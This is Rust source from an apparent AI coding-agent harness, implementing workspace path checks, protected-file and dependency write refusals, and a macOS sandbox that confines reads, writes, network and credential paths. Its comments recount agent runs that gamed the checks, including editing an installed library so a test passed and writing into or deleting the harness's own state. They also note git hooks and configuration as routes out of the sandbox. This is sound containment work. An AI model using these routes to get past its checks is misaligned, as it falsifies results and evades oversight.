            // was attached as a reference, the model sent `ls -la` with it as
            // cwd, was told no reference folder contained it, and spent a
            // hundred actions looking for the files some other way.
            format!(
                "{} is inside the read-only reference folder {}: read its files with read_file \
                 using that path (for example `{}/README.md`). Commands, search, list_tree and \
                 every write work only inside the workspace.",
                relative.display(),
                reference.display(),
                reference.display()
            )
        } else {
            format!(
                "{} is outside the workspace: paths are relative to the workspace root, with \
                 no leading / and no ... A folder outside is reachable only when the person \
                 allows it (Full access, or when asked) or declares it as a reference folder.",
                relative.display()
            )
        }
    }

    /// The declared reference folder a path outside the workspace falls in.
    fn reference_containing(&self, relative: &Path) -> Option<PathBuf> {
        let joined = if relative.is_absolute() {
            relative.to_path_buf()
        } else {
            self.root.join(relative)
        };
        let canonical = joined.canonicalize().ok()?;
        self.extra_readable
            .iter()
            .filter_map(|root| root.canonicalize().ok())
            .find(|root| canonical.starts_with(root))
    }

    /// A path written as if the workspace were the filesystem's root --
    /// `/slugify.py`, or `/workspace/slugify.py` after the container
    /// convention -- read as the workspace-relative path it names, only when
    /// that exists inside the workspace. The result is still under the root,
    /// so nothing outside becomes reachable. Decided 2026-09-19 (catalogue,
    /// Nemotron 3.5): told "Did you mean slugify.py? It exists." it sent
    /// `/slugify.py` five more times and then spent its budget on
    /// `os.path.abspath('.')`.
    fn root_anchored(&self, relative: &Path) -> Option<PathBuf> {
        if !relative.is_absolute()
            || relative
                .components()
                .any(|c| matches!(c, Component::ParentDir))
        {
            return None;
        }
        let parts: PathBuf = relative
            .components()
            .filter(|c| matches!(c, Component::Normal(_)))
            .collect();
        let without_mount = parts.strip_prefix("workspace").ok().map(Path::to_path_buf);
        [Some(parts), without_mount]
            .into_iter()
            .flatten()
            .find(|candidate| {
                !candidate.as_os_str().is_empty() && self.root.join(candidate).exists()
            })
    }

    pub fn resolve(&self, relative: &Path) -> Result<PathBuf, ToolError> {
        let anchored = self.root_anchored(relative);
        let relative = anchored.as_deref().unwrap_or(relative);
        let root = self
            .root
            .canonicalize()
            .map_err(|_| ToolError::Denied("workspace root is unavailable".into()))?;
        let outside_granted = self.approvals.contains(&Approval::OutsideWorkspace);
        if relative.is_absolute()
            || relative
                .components()
                .any(|c| matches!(c, Component::ParentDir))
        {
            // Inside after all (`../web/x` from `web`, or its absolute path):
            // the workspace, needing nothing.
            let lexical = lexical_join(&root, relative);
            if lexical.starts_with(&root) {
                let inside = lexical
                    .strip_prefix(&root)
                    .unwrap_or(&lexical)
                    .to_path_buf();
                if !inside.as_os_str().is_empty() {
                    return self.resolve(&inside);
                }
                return Ok(root);
            }
            if !outside_granted {
                return Err(ToolError::Denied(self.escape_refusal(relative)));
            }
            return resolve_existing_ancestor(&lexical);
        }
        let result = root.join(relative);
        let checked = if result.exists() {
            result
                .canonicalize()
                .map_err(|_| ToolError::Denied("unable to resolve target".into()))?
        } else {
            // The target does not exist yet, and neither may several of its
            // parents: creating `src/app.js` in an empty workspace has no `src`
            // to canonicalise. Resolve the deepest ancestor that does exist,
            // which is where any symlink could redirect the path, and rebuild
            // the rest onto it. `..` and absolute paths were already refused,
            // so the remainder cannot climb back out.
            // `symlink_metadata`, not `exists`: a link whose target is missing
            // "does not exist", and writing through it created the file
            // wherever it pointed -- outside the workspace. Stopping at the
            // link makes it the part that is resolved, and refused.
            let mut existing = result.as_path();
            let mut trailing = Vec::new();
            while std::fs::symlink_metadata(existing).is_err() {
                trailing.push(
                    existing
                        .file_name()
                        .ok_or_else(|| ToolError::Denied("target has no file name".into()))?
                        .to_owned(),
                );
                existing = existing
                    .parent()
                    .ok_or_else(|| ToolError::Denied("target has no parent".into()))?;
            }
            let mut resolved = existing
                .canonicalize()
                .map_err(|_| ToolError::Denied("target parent is unavailable".into()))?;
            for component in trailing.iter().rev() {
                resolved.push(component);
            }
            resolved
        };
        if !checked.starts_with(&root) && !outside_granted {
            return Err(ToolError::Denied("path escapes workspace root".into()));
        }
        Ok(checked)
    }

    /// Whether `relative` names a place outside the workspace: an absolute
    /// path elsewhere, or `..` climbing above the root. Lexical, for the
    /// question asked before acting; `resolve` still judges links.
    pub fn leaves_root(&self, relative: &Path) -> bool {
        if !relative.is_absolute()
            && !relative
                .components()
                .any(|c| matches!(c, Component::ParentDir))
        {
            return false;
        }
        if self.root_anchored(relative).is_some() || self.reference_containing(relative).is_some() {
            return false;
        }
        let root = self
            .root
            .canonicalize()
            .unwrap_or_else(|_| self.root.clone());
        !lexical_join(&root, relative).starts_with(&root)
    }
    /// A path to read, inside the workspace or inside a read-only reference
    /// folder the workspace declared (`extra_readable`).
    ///
    /// Writing still goes through [`Self::resolve`] alone. Measured on
    /// 2026-09-22: a site built in `pwr-website/` was told to read the
    /// project's documentation in the parent folder, sent `read_file
    /// ../README.md`, was refused, read the workspace's own Angular README
    /// instead and wrote the site from memory and an out-of-date CV.
    pub fn resolve_readable(&self, relative: &Path) -> Result<PathBuf, ToolError> {
        match self.resolve(relative) {
            Ok(path) => Ok(path),
            Err(refused) => self
                .reenter_workspace(relative)
                .or_else(|| self.resolve_reference(relative))
                .ok_or(refused),
        }
    }

    /// `../site/src/x.ts` from a workspace named `site`: a path that leaves
    /// the workspace only to come back into it. Seen 2026-09-22 with the
    /// parent declared as a reference folder -- the model addressed its own
    /// attachment through the parent and was refused twice.
    fn reenter_workspace(&self, relative: &Path) -> Option<PathBuf> {
        let root = self.root.canonicalize().ok()?;
        let mut lexical = if relative.is_absolute() {
            PathBuf::new()
        } else {
            root.clone()
        };
        for component in relative.components() {
            match component {
                Component::ParentDir => {
                    lexical.pop();
                }
                Component::CurDir => {}
                other => lexical.push(other),
            }
        }
        let inside = lexical.strip_prefix(&root).ok()?.to_path_buf();
        self.resolve(&inside).ok()
    }

    fn resolve_reference(&self, relative: &Path) -> Option<PathBuf> {
        if self.extra_readable.is_empty() {
            return None;
        }
        let joined = if relative.is_absolute() {
            relative.to_path_buf()
        } else {
            self.root.join(relative)
        };
        // Canonical, so a symlink inside a reference folder cannot point
        // anywhere the declaration did not name.
        let canonical = joined.canonicalize().ok()?;
        let private = canonical.components().any(|component| match component {
            Component::Normal(name) => {
                let name = name.to_string_lossy();
                name == ".pwr" || name == ".git" || name.starts_with(".env")
            }
            _ => false,
        });
        if private {
            return None;
        }
        self.extra_readable
            .iter()
            .filter_map(|root| root.canonicalize().ok())
            .any(|root| canonical.starts_with(root))
            .then_some(canonical)
    }

    /// Whether this run may reach the network.
    ///
    /// Derived from the grant rather than stored separately: a policy with the
    /// network open and no approval recorded would be a boundary nobody
    /// authorised, and the audit would not show who did.
    pub fn network_allowed(&self) -> bool {
        self.approvals.contains(&Approval::NetworkAccess)
    }
    /// Denies unless the user granted this approval for the run.
    /// Refuses a change to a path the task declared unchangeable.
    ///
    /// Reading stays open: the specification is meant to be read. Only writing
    /// is refused, and the refusal says why and points at the likeliest
    /// mistake, because the call that hits this is usually a right change
    /// aimed at the wrong path.
    pub fn refuse_if_protected(&self, relative: &Path) -> Result<(), ToolError> {
        // Compared as `resolve` will read it, so `/spec.md` (root-anchored)
        // or `./spec.md` cannot reach a protected `spec.md` around this check.
        let anchored = self
            .reenter_workspace(relative)
            .or_else(|| self.root_anchored(relative));
        let normalized: PathBuf = anchored
            .as_deref()
            .unwrap_or(relative)
            .components()
            .filter(|c| !matches!(c, Component::CurDir))
            .collect();
        let physical = self.resolve(relative).ok().map(|path| {
            self.root
                .canonicalize()
                .ok()
                .and_then(|root| path.strip_prefix(root).ok().map(Path::to_path_buf))
                .unwrap_or(path)
        });
        for path in std::iter::once(&normalized).chain(physical.iter()) {
            self.refuse_if_installed_dependency(path)?;
            refuse_if_runs_outside(path)?;
        }
        if !self.protected.iter().any(|frozen| {
            std::iter::once(&normalized)
                .chain(physical.iter())
                .any(|path| path.starts_with(frozen) || frozen.starts_with(path))
        }) {
            return Ok(());
        }
        Err(ToolError::Denied(format!(
            "{} is part of the task and cannot be changed; it can only be read. If this content \
             belongs in a file you are creating, the path is wrong -- check it against the \
             specification.",
            relative.display()
        )))
    }

    /// Refuses a write into an installed dependency, unless the run was
    /// granted `DependencyChange`.
    ///
    /// Measured 2026-09-23, on the task built to test dependency search: asked
    /// to use an in-house package installed in `node_modules`, a run edited
    /// *the package* -- it changed one character of the library's alphabet so
    /// that the acceptance test's expected string came out -- and the checks
    /// then passed. The audit recorded `verified: true` about a workspace
    /// whose library no longer did what it says. Editing a manifest was
    /// already an approval gate for exactly this reason; the installed tree is
    /// the same decision, and was open.
    ///
    /// Reading stays open: the installed source is evidence, and searching it
    /// is the point of `in_dependencies`.
    /// Refuses a write to what runs, or decides, outside the sandbox: PWR's
    /// own state, and a git repository's hooks and configuration.
    ///
    /// `.git/hooks/*` and `.git/config` (a `core.fsmonitor`, a filter, an
    /// alias, a `core.hooksPath`) are executed by the next `git` anyone runs
    /// -- the person in their terminal, their editor -- with the person's
    /// rights and no sandbox, and neither shows in a diff the person reviews.
    /// Everything else in `.git` stays writable, so commits, branches and
    /// stashes work as before. `.pwr` holds the event store and the files
    /// that decide how a run is checked (`checks.json`) and what it may not
    /// touch (`protected.json`); the sandbox already denies it to commands.
    /// Compared without case: macOS's file system is case-insensitive, so
    /// `.GIT/HOOKS` is the same folder.
    fn refuse_if_installed_dependency(&self, normalized: &Path) -> Result<(), ToolError> {
        if self.approvals.contains(&Approval::DependencyChange) {
            return Ok(());
        }
        let parts: Vec<String> = normalized
            .components()
            .filter_map(|component| match component {
                Component::Normal(name) => Some(name.to_string_lossy().into_owned()),
                _ => None,
            })
            .collect();
        let Some(position) = parts
            .iter()
            .position(|part| part == "node_modules" || part == "site-packages" || part == "vendor")
        else {
            return Ok(());
        };
        // The directory itself is not the dependency; what it contains is.
        if position + 1 >= parts.len() {
            return Ok(());
        }
        Err(ToolError::Denied(format!(
            "{} is inside {}, the installed dependencies: their source is what the project \
             builds against, so changing it here would make the checks pass against a library \
             that no longer does what it says. Read it freely -- `search` with in_dependencies, \
             or read_file -- and put the change in this project's own files. A real dependency \
             change is a manifest edit and an approval.",
            normalized.display(),
            parts[position]
        )))
    }

    /// Whether this policy lets `executable` run: it is one of the workspace's
    /// programs, or running programs outside the list has been granted.
    pub fn permits_program(&self, executable: &str) -> bool {
        self.approvals.contains(&Approval::ToolchainInstall)
            || self
                .allow_commands
                .iter()
                .any(|allowed| allowed == executable)
    }

    pub fn require(&self, approval: Approval) -> Result<(), ToolError> {
        if self.approvals.contains(&approval) {
            return Ok(());
        }
        Err(ToolError::Denied(format!(
            "{approval:?} requires explicit user approval"
        )))
    }
    /// Builds a seatbelt profile confining writes to the workspace root.
    ///
    /// Returns `None` when the platform offers no sandbox, or when the root
    /// cannot be expressed safely in a profile.
    fn sandbox_profile(&self) -> Option<String> {
        if !cfg!(target_os = "macos") || !Path::new(SEATBELT).is_file() {
            return None;
        }
        // The canonical path is required: on macOS `/tmp` is a symlink, and a
        // profile written against the uncanonical path grants nothing.
        let root = self.root.canonicalize().ok()?;
        let root = root.to_str()?;
        // A root that cannot be quoted safely would let the path itself rewrite
        // the profile, so refuse rather than emit a weakened one.
        if root.contains('"') || root.contains('\\') {
            return None;
        }
        // Order matters in a seatbelt profile: the last matching rule wins, so
        // the loopback allowance must follow the blanket denial it carves out
        // of. Written the other way round it grants nothing.
        // Nothing a run legitimately does needs the host's credentials, and a
        // sandbox that confines writes while leaving reads open is one half of
        // an exfiltration. `HOME` already points inside the workspace, so a
        // well-behaved tool reads the workspace copy of these and never the
        // host's; this denies the absolute paths that bypass that. Applied to
        // every sandboxed run rather than only to a grant, because there is no
        // run for which reading them would have been right.
        let quotable = |path: &std::path::Path| -> Option<String> {
            let path = path.to_str()?;
            (!path.contains('"') && !path.contains('\\')).then(|| format!("(subpath \"{path}\")"))
        };
        // The host's real home, which is not where the child's HOME points.
        let host_home = std::env::var_os("HOME").map(std::path::PathBuf::from);
        let mut secrets = String::new();
        if let Some(home) = &host_home {
            let subpaths: Vec<String> = NEVER_READABLE
                .iter()
                .map(|relative| home.join(relative))
                .filter_map(|path| quotable(&path))
                .collect();
            if !subpaths.is_empty() {
                secrets = format!("(deny file-read* {})", subpaths.join(""));
            }
            // Kept even though the home is now unreadable by default: these
            // are the paths for which no run has a reason, and a later
            // allowlist entry that widened the home would otherwise reopen
            // them silently.
        }
        // Reads were open. The sandbox confined writes and denied the network
        // and nine known credential paths, and left everything else on the
        // machine legible -- which, with `--provision` granting an arbitrary
        // executable and a network together, is the shape of an exfiltration.
        //
        // So reading is denied by default and opened deliberately: the system
        // paths a process needs to start, the workspace, and the toolchain
        // directories the derived command allowlist actually names. The rest of
        // the home -- documents, mail, browser profiles, other repositories --
        // is no longer readable by a command the agent runs.
        let mut readable: Vec<String> = SYSTEM_READABLE
            .iter()
            .chain(TOOLCHAIN_PREFIXES.iter())
            .map(std::path::Path::new)
            .filter_map(|path| {
                // The root is a literal, not a subpath: as a subpath it would
                // re-open everything the denial just closed.
                if path == std::path::Path::new("/") {
                    return Some("(literal \"/\")".to_string());
                }
                quotable(path)
            })
            .collect();
        // Any Xcode, whatever its name. `/Applications/Xcode.app` above is only
        // the default: a machine with several (`Xcode_15.4.app`,
        // `Xcode-beta.app`) runs `git` and the compilers from one of those,
        // and denying its own configuration broke `git status` on the CI
        // runner (2026-09-23), as it would on such a Mac.
        readable.push(r#"(regex #"^/Applications/Xcode[^/]*\.app(/|$)")"#.to_owned());
        readable.push(format!("(subpath \"{root}\")"));
        readable.extend(
            RUNTIME_WRITABLE
                .iter()
                .filter_map(|path| quotable(Path::new(path))),
        );
        // Only where the workspace runs Apple's toolchain: it is every
        // application's temporary directory, and nothing else needs it.
        let apple_temp = self
            .allow_commands
            .iter()
            .any(|program| APPLE_TOOLCHAIN_PROGRAMS.contains(&program.as_str()))
            .then(darwin_user_temp_dir)
            .flatten()
            .and_then(quotable);
        readable.extend(apple_temp.clone());
        readable.extend(
            self.extra_readable
                .iter()
                .filter_map(|path| path.canonicalize().ok())
                .filter_map(|path| quotable(&path)),
        );
        if let Some(home) = &host_home {
            readable.extend(
                TOOLCHAIN_READABLE
                    .iter()
                    .map(|relative| home.join(relative))
                    .filter_map(|path| quotable(&path)),
            );
            if self.allow_commands.iter().any(|program| {
                Path::new(program).file_name() == Some(std::ffi::OsStr::new("dotnet"))
            }) {
                readable.extend(quotable(&home.join(".dotnet")));
            }
        }
        let container_engine = self.approvals.contains(&Approval::ContainerEngine);
        if container_engine && let Some(client) = container_client_home() {
            readable.extend(quotable(&client));
        }
        // Data rather than every read. Resolving a path walks its components,
        // and denying metadata denies that walk -- the executable itself stops
        // being findable, which is a broken sandbox rather than a strict one.
        // Denying the data still closes what matters: contents are unreadable
        // and a directory cannot be listed, so a command can neither read the
        // user's files nor enumerate them.
        // PWR's own state, denied to the agent's commands.
        //
        // `list_tree` and `search` exclude it through the shared walker, but a
        // command does not go through that walker: `ls -la` and `find` see the
        // event log, the index artifacts and the calibration records, and a
        // real run spent a fifth of its budget exploring them before it had
        // installed anything. The agent's workspace is the project, not the
        // harness's records of the project.
        //
        // The scratch directory is deliberately not denied: it is the child's
        // own HOME and TMPDIR, and denying it would break the tools that were
        // pointed at it.
        // Named, not indexed. This read the fourth element of a list whose
        // order is nobody's contract, so adding an exclusion moved which
        // directory the sandbox denied.
        let state = std::path::Path::new(root).join(STATE_DIRECTORY);
        // `file-read-data`, not `file-read*`. Measured: seatbelt resolves the
        // last matching rule *per operation name*, so a `file-read*` denial
        // after a `file-read-data` allowance does not override it and the path
        // stays readable. The two look interchangeable and are not.
        //
        // Its directories stay listable; only its files' contents are denied.
        // A repository's own tooling walks the whole workspace -- `xo` and
        // `ava` glob it through `globby`, which treats a directory it cannot
        // list as fatal -- and a state directory nothing could list made every
        // such check crash with `EPERM: scandir '.pwr'`. Measured in the R2
        // pilot of 2026-09-14: the visible verifier of all five filenamify and
        // slugify tasks failed in every arm before any deployment acted. The
        // names of the records are what that costs; their contents stay closed.
        let harness_state = quotable(&state)
            .map(|state| {
                format!(
                    "(deny file-read-data {state})\
                     (allow file-read-data (require-all {state} (vnode-type DIRECTORY)))"
                )
            })
            .unwrap_or_default();
        // Writes too. The read denial hid the records and left them writable,
        // because the workspace write allowance covers `.pwr` and nothing
        // followed it: a sandboxed `echo x > .pwr/probe` or
        // `rm .pwr/indexes/idx.json` succeeded, so a command could truncate
        // the event store mid-run, where edit capabilities are refused by
        // `refuse_if_protected`. `subpath` matches whole path components, so
        // `.pwr-scratch`, the child's HOME and TMPDIR, stays writable.
        let mut harness_state_writes = quotable(&state)
            .map(|state| format!("(deny file-write* {state})"))
            .unwrap_or_default();
        // Apply the same frozen-path contract to interpreters and checks.
        // An unquotable path refuses the profile; it never silently weakens it.
        for protected in &self.protected {
            let path = self.root.join(protected);
            let path = path.canonicalize().unwrap_or(path);
            let filter = quotable(&path)?;
            harness_state_writes.push_str(&format!("(deny file-write* {filter})"));
            // Renaming a parent would relocate protected children without a
            // write to their own paths. Deny unlink/rename of ancestors, while
            // sibling files and directory creation remain writable.
            for parent in path
                .ancestors()
                .skip(1)
                .take_while(|parent| parent.starts_with(root))
            {
                let literal = quotable(parent)?.replacen("(subpath", "(literal", 1);
                harness_state_writes.push_str(&format!("(deny file-write-unlink {literal})"));
            }
        }
        if !self.approvals.contains(&Approval::DependencyChange) {
            harness_state_writes.push_str(
                r#"(deny file-write* (regex #"(^|/)(node_modules|site-packages|vendor)(/|$)"))"#,
            );
        }
        // A repository's hooks, for the reason `refuse_if_runs_outside`
        // gives: git runs them later, unconfined. Only once `.git` exists:
        // `git init` writes them. Its configuration stays writable -- `git
        // remote add`, a branch that tracks one -- and what a command adds
        // to it that git would run is taken out afterwards (`GitConfigGuard`).
        let hooks = std::path::Path::new(root).join(".git").join("hooks");
        if hooks.is_dir()
            && let Some(path) = hooks
                .to_str()
                .filter(|path| !path.contains('"') && !path.contains('\\'))
        {
            harness_state_writes.push_str(&format!("(deny file-write* (subpath \"{path}\"))"));
        }
        let reads = format!(
            "(deny file-read-data)(allow file-read-data {}){harness_state}",
            readable.join("")
        );
        let network = if self.network_allowed() {
            String::new()
        } else if self.approvals.contains(&Approval::LocalService) {
            // `localhost` is not loopback, and cannot be narrowed to it.
            // seatbelt accepts only `*` or `localhost` as the host in a
            // network address -- a literal `127.0.0.1` is rejected and the
            // whole profile fails to compile -- and its `localhost` means this
            // *host*: every address the machine holds, its LAN interfaces
            // included. So this grant reaches a service listening on this
            // machine's LAN address, not only on loopback, and a process under
            // it can be reached from the LAN if it binds there.
            //
            // That is wider than the name suggests and is the platform's
            // limit, not a choice. What it still withholds is the part that
            // matters: a genuinely remote host is denied, so nothing leaves
            // the machine. A fixture asserts that denial by its error --
            // `PermissionError` from the sandbox rather than a timeout --
            // because an earlier version aimed at a public address passed
            // vacuously when the connection merely timed out.
            //
            // All three operations, because a service needs every one: bind to
            // take the port, inbound to listen and accept, outbound to be
            // connected to. Granting bind alone lets a server claim a port and
            // then fail at `listen`, which another fixture caught.
            "(deny network*)(allow network-bind (local ip \"localhost:*\"))\
             (allow network-inbound (local ip \"localhost:*\"))\
             (allow network-outbound (remote ip \"localhost:*\"))"
                .to_string()
        } else {
            "(deny network*)".to_string()
        };
        let mut network = network;
        // The browser's own sockets, in the one directory kept for them.
        if self.approvals.contains(&Approval::LocalService) && !self.network_allowed() {
            network.push_str(&format!(
                "(allow network-bind (local unix-socket (subpath \"{BROWSER_SCRATCH}\")))\
                 (allow network-inbound (local unix-socket (subpath \"{BROWSER_SCRATCH}\")))\
                 (allow network-outbound (remote unix-socket (subpath \"{BROWSER_SCRATCH}\")))"
            ));
        }
        // Sockets between the command's own processes. Measured 2026-09-29:
        // `dotnet build` of a three-project solution hung until it was
        // stopped. MSBuild's build nodes are separate processes that talk
        // over Unix sockets, and MSBuild puts them at `/tmp/MSBuild<pid>`
        // whatever TMPDIR says (macOS keeps socket paths short);
        // `(deny network*)` and the write denial refused the node's socket,
        // the node died in `NamedPipeServerStream`'s constructor, and the
        // parent waited for it. .NET's other pipes follow TMPDIR, the
        // workspace's scratch directory.
        //
        // What stays open: a socket named like an MSBuild node could also be
        // one a build outside the sandbox left running for reuse. Commands
        // here are told not to reuse nodes (MSBUILDDISABLENODEREUSE), so a
        // build never looks for one; reaching one on purpose is the residual
        // risk of letting .NET build at all.
        if !self.network_allowed() {
            let scratch = format!("{root}/{SCRATCH_DIRECTORY}");
            network.push_str(&format!(
                "(allow network-bind (local unix-socket (subpath \"{scratch}\")))\
                 (allow network-inbound (local unix-socket (subpath \"{scratch}\")))\
                 (allow network-outbound (remote unix-socket (subpath \"{scratch}\")))\
                 (allow network-bind (local unix-socket (regex #\"{MSBUILD_NODE_SOCKET}\")))\
                 (allow network-inbound (local unix-socket (regex #\"{MSBUILD_NODE_SOCKET}\")))\
                 (allow network-outbound (remote unix-socket (regex #\"{MSBUILD_NODE_SOCKET}\")))"
            ));
        }
        // The engine's socket and nothing else of the filesystem's sockets,
        // after the denial it carves out of. Measured 2026-09-26: `docker
        // version` under `(deny network*)` is "permission denied while trying
        // to connect to the docker API", and with this one rule it answers.
        if container_engine
            && !self.network_allowed()
            && let Some(socket) = container_socket()
            && let Some(socket) = socket.to_str()
            && !socket.contains('"')
            && !socket.contains('\\')
        {
            network.push_str(&format!(
                "(allow network-outbound (remote unix-socket (path-literal \"{socket}\")))"
            ));
        }
        // Order is load-bearing: the last matching rule wins, so the reads
        // allowlist follows its blanket denial and the credential denial
        // follows the allowlist -- otherwise a key under a readable toolchain
        // directory would be readable again.
        let mut runtime_writes: String = RUNTIME_WRITABLE
            .iter()
            .filter_map(|path| quotable(Path::new(path)))
            .chain(apple_temp)
            .map(|path| format!("(allow file-write* {path})"))
            .collect();
        // NuGet's first-run migration uses mkdtemp("/tmp/.dotnet.XXXXXX")
        // even with HOME and TMPDIR inside the workspace. Seatbelt checks the
        // created path, so allow only that runtime's temporary directories.
        runtime_writes
            .push_str(r#"(allow file-write* (regex #"^/private/tmp/[.]dotnet[.][^/]+(/|$)"))"#);
        // MSBuild's node sockets, created where it always puts them (above).
        runtime_writes.push_str(&format!(
            r#"(allow file-write* (regex #"{MSBUILD_NODE_SOCKET}"))"#
        ));
        Some(format!(
            "(version 1)(allow default)(deny signal)(allow signal (target same-sandbox))(deny file-write*)(allow file-write* (subpath \"{root}\")){runtime_writes}{harness_state_writes}(allow file-write-data (literal \"/dev/null\") (literal \"/dev/stdout\") (literal \"/dev/stderr\")){reads}{secrets}{network}"
        ))
    }
    /// Whether a command will actually be sandboxed, refusing if it must be
    /// and cannot.
    pub fn will_sandbox(&self) -> Result<bool, ToolError> {
        let available = match self.sandbox {
            SandboxPolicy::Disabled | SandboxPolicy::FullAccess => None,
            SandboxPolicy::Preferred | SandboxPolicy::Required => self.sandbox_profile(),
        };
        self.refuse_if_unconfined(available.is_some())?;
        Ok(available.is_some())
    }

    /// The one decision about running without a sandbox, shared by the check
    /// and by the command builder so they cannot disagree.
    fn refuse_if_unconfined(&self, sandbox_available: bool) -> Result<(), ToolError> {
        if sandbox_available {
            return Ok(());
        }
        match self.sandbox {
            SandboxPolicy::Disabled | SandboxPolicy::FullAccess => Ok(()),
            SandboxPolicy::Required => Err(ToolError::Denied(
                "policy requires a sandbox and this platform provides none".into(),
            )),
            SandboxPolicy::Preferred if unconfined_allowed() => Ok(()),
            SandboxPolicy::Preferred => Err(ToolError::Denied(
                "this platform has no sandbox PWR can apply, so the command was not run: it \
                 would have run with your full rights, outside the workspace boundary. Set \
                 PWR_ALLOW_UNCONFINED=1 to run commands unconfined anyway."
                    .into(),
            )),
        }
    }

    /// Builds a child command with the boundary already applied.
    ///
    /// One place, because a second way of starting a process is a second
    /// chance to forget the sandbox, the scratch directory or the cleared
    /// environment. A long-running service goes through exactly this.
    pub fn prepare_command(&self, executable: &str, args: &[String]) -> Result<Command, ToolError> {
        let profile = match self.sandbox {
            SandboxPolicy::Disabled | SandboxPolicy::FullAccess => None,
            SandboxPolicy::Preferred | SandboxPolicy::Required => self.sandbox_profile(),
        };
        self.refuse_if_unconfined(profile.is_some())?;
        let mut command = match &profile {
            Some(profile) => {
                let mut wrapped = Command::new(SEATBELT);
                wrapped
                    .arg("-p")
                    .arg(profile)
                    .arg(executable)
                    .args(without_nested_sandbox(executable, args));
                wrapped
            }
            None => {
                let mut plain = Command::new(executable);
                plain.args(args);
                plain
            }
        };
        // Build tooling needs a scratch directory -- rustdoc creates one per
        // doctest run -- and the system one lies outside the sandbox. Rather
        // than widening the boundary to all of $TMPDIR, which would let one
        // workspace write into another's, the child is given a scratch
        // directory inside its own root.
        //
        // The canonical root, for the same reason the seatbelt profile needs
        // it: on macOS the uncanonical path is a symlink, and handing the
        // child that path makes its scratch directory look like it lies
        // outside the workspace.
        let scratch = self
            .root
            .canonicalize()
            .unwrap_or_else(|_| self.root.clone())
            .join(SCRATCH_DIRECTORY);
        let _ = std::fs::create_dir_all(&scratch);
        // The workspace's own toolchains first, then the host's.
        let canonical_root = self
            .root
            .canonicalize()
            .unwrap_or_else(|_| self.root.clone());
        let mut path_entries = toolchain_paths(&canonical_root);
        if let Some(host) = std::env::var_os("PATH") {
            path_entries.extend(std::env::split_paths(&host));
        }
        let path = std::env::join_paths(&path_entries)
            .unwrap_or_else(|_| std::env::var_os("PATH").unwrap_or_default());
        if self.sandbox == SandboxPolicy::FullAccess {
            // The person's environment as it is, less what only makes output
            // harder for a model to read.
            command
                .current_dir(&self.root)
                .env("PATH", path)
                .env("DOTNET_NOLOGO", "1")
                .env("DOTNET_CLI_UI_LANGUAGE", "en")
                .env("NO_COLOR", "1")
                .env("FORCE_COLOR", "0")
                .env("CI", "1");
            for (variable, home) in toolchain_homes(&canonical_root) {
                command.env(variable, home);
            }
            return Ok(command);
        }
        command
            .current_dir(&self.root)
            .env_clear()
            // PATH is allowlisted solely for executable resolution; never logged.
            .env("PATH", path)
            // .NET's first-run banner and telemetry, which every run would meet
            // again with HOME in the workspace.
            .env("DOTNET_NOLOGO", "1")
            // The SDK speaks the system's language otherwise, and what a
            // check printed is read for failing tests and for how many ran:
            // "Superati: 10" is not a count PWR knows (seen 2026-10-07).
            .env("DOTNET_CLI_UI_LANGUAGE", "en")
            .env("DOTNET_CLI_TELEMETRY_OPTOUT", "1")
            .env("DOTNET_SKIP_FIRST_TIME_EXPERIENCE", "1")
            // A build here starts its own nodes, never one left running
            // outside the sandbox (see the MSBuild socket rule).
            .env("MSBUILDDISABLENODEREUSE", "1")
            .env("TMPDIR", &scratch)
            // Clang's module cache (Swift's too) defaults to the per-user
            // cache directory, shared by every build on the machine; inside
            // the workspace it can neither be refused nor poison another.
            .env(
                "CLANG_MODULE_CACHE_PATH",
                scratch.join("clang-module-cache"),
            )
            .env("TMP", &scratch)
            .env("TEMP", &scratch)
            // Output is read by a model, not a terminal. Measured 2026-09-22:
            // a failing `ng test` reached the model as `^[[31m⎯⎯⎯^[[39m^[[1m^[[41m
            // Failed Tests 1`, escape codes costing tokens around the one line
            // that mattered.
            .env("NO_COLOR", "1")
            .env("FORCE_COLOR", "0")
            .env("CI", "1")
            // Package managers keep caches and config under HOME. Pointing it
            // into the workspace keeps them inside the boundary instead of
            // widening it, and makes a run hermetic: nothing it downloads
            // persists into the next one, and nothing in the real home
            // directory is read.
            .env("HOME", &scratch)
            // Gradle's caches, which it keeps under `user.home`, not HOME.
            .env("GRADLE_USER_HOME", scratch.join(".gradle"));
        // A JVM takes `user.home` from the account, not from HOME, and on
        // macOS its temporary directory from the system, not from TMPDIR.
        // Measured 2026-09-27 (stack matrix c3): Maven tried to create its
        // repository in the real home and was refused (java-ratelimit, four
        // times; spring-library until the model found -Dmaven.repo.local),
        // and Maven's jansi lock was refused in /var/folders (kotlin-rules,
        // spring-library). Only a path without whitespace: the JVM splits
        // these options on it.
        if let Some(scratch) = scratch
            .to_str()
            .filter(|path| !path.contains(char::is_whitespace))
        {
            command.env(
                "JAVA_TOOL_OPTIONS",
                format!("-Duser.home={scratch} -Djava.io.tmpdir={scratch}"),
            );
        }
        // After the clear, or it would take them away again.
        for (variable, home) in toolchain_homes(&canonical_root) {
            command.env(variable, home);
        }
        if self.approvals.contains(&Approval::ContainerEngine) {
            // The client's contexts live in the real home, which a command
            // cannot read: name the socket instead, and point the client at
            // the plugins `docker build` and `docker compose` are.
            if let Some(socket) = container_socket() {
                command.env("DOCKER_HOST", format!("unix://{}", socket.display()));
            }
            let plugins = container_client_home()
                .map(|home| home.join("cli-plugins"))
                .filter(|plugins| plugins.is_dir());
            let config = scratch.join(".docker");
            if let Some(plugins) = plugins.as_deref().and_then(Path::to_str)
                && !plugins.contains('"')
                && !plugins.contains('\\')
                && !config.join("config.json").exists()
                && std::fs::create_dir_all(&config).is_ok()
            {
                let _ = std::fs::write(
                    config.join("config.json"),
                    format!("{{\"cliPluginsExtraDirs\":[\"{plugins}\"]}}"),
                );
            }
        }
        Ok(command)
    }

    pub fn redact(&self, text: &str) -> (String, bool) {
        let re = Regex::new(r"(?i)(api[_-]?key|token|password)\s*[=:]\s*[^\s]+|AKIA[0-9A-Z]{16}")
            .expect("valid regex");
        let result = re.replace_all(text, "[REDACTED]").to_string();
        let changed = result != text;
        (result, changed)
    }
}
/// Where a `find` that does not match stops matching.
///
/// "Does not appear" is true and leaves the caller with one move: read the
/// whole file again and try to spot the difference. Measured on an 80B
/// rewriting an Angular scaffold: the file was 21 KB, the `find` was a hundred
/// characters of it copied a shade wrong, and the refusal cost a second full
/// read. Those two reads were 42 KB of a 65,536-token conversation, and the run
/// ended having filled its context rather than having failed at the task.
///
/// So the refusal says how much of the `find` did match and what the file
/// actually holds at that point. The longest matching prefix is well defined --
/// if a prefix of length n appears then so does every shorter one -- so it is
/// found by bisection rather than guessed at.
